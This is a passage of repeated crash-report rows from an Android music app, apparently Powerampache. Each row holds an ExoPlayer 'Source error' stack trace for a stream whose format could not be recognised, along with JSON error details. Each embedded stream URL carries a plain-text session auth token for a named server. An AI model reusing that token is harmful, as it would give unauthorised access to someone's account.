stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
vrUpX504,2025-04-11T08:40:50.323339,powerampache,PHP,Thursday 10th of April 2025 10:40:51 PM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":85},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":310938318,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d363a26e599f5477fcb1c8b1f466e233f\u0026type\u003dsong\u0026id\u003d4570"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
H2M0cXPW,2025-04-11T08:40:49.292397,powerampache,PHP,Thursday 10th of April 2025 10:40:50 PM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":85},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":310936932,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d363a26e599f5477fcb1c8b1f466e233f\u0026type\u003dsong\u0026id\u003d4570"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
NTbHHev5,2025-04-11T08:40:48.252400,powerampache,PHP,Thursday 10th of April 2025 10:40:49 PM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":85},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":310933098,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d363a26e599f5477fcb1c8b1f466e233f\u0026type\u003dsong\u0026id\u003d4570"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
bzwEjiw5,2025-04-11T08:40:44.064963,powerampache,PHP,Thursday 10th of April 2025 10:40:48 PM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":85},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":310930735,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d363a26e599f5477fcb1c8b1f466e233f\u0026type\u003dsong\u0026id\u003d4570"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
VvcySxcz,2025-04-11T08:40:44.452393,powerampache,PHP,Thursday 10th of April 2025 10:40:45 PM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":85},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":310932488,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d363a26e599f5477fcb1c8b1f466e233f\u0026type\u003dsong\u0026id\u003d4570"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source 